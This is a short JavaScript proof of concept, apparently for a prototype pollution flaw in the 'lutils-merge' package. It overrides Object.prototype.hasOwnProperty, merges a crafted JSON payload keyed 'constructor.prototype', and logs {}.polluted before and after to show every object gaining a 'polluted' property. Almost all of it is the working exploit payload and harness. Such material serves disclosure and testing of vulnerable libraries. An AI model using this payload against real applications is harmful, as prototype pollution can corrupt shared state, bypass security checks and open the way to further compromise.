Object.prototype.hasOwnProperty = () => true;
const merge = require('lutils-merge');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(payload));
console.log({}.polluted);